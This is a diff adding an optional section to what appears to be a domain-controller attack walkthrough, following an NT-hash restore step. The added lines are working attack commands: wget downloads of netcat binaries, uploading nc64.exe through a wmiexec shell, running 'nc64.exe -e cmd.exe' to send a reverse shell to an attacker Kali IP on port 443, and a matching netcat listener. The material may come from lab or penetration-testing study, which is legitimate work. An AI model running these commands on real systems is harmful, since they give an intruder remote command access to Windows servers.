@@ -163,3 +163,27 @@ shutdown /s /t 0
 python3 reinstall_original_pw.py WIN-3AMIT8RJ9OB 192.168.1.153 cf404c607f29d847da44a3ee1479398c
 ```
 - The format ```python3 reinstall_original_pw.py NETBIOS_NAME SERVER_IP NTHASH```
+
+## OPTIONAL:
+#### Reverse Netcat Shell
+
+64 Bits
+```bash
+wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe
+```
+32 Bits
+```bash
+wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe
+```
+(Inside wmiexec Shell)
+#### Send file from linux to windows (inside wmiexec.py) and then shutdown windows Server
+```
+lput nc64.exe C:\Users\Administrator\Desktop\
+cd Users\Administrator\Desktop\
+nc64.exe -e cmd.exe 192.168.1.151 443
+```
+- The format ```nc64.exe -e cmd.exe KALI_IP PORT```
+#### In Kali terminal to listen for netcat reverse shell
+```bash
+nc -nlvp 443
+```
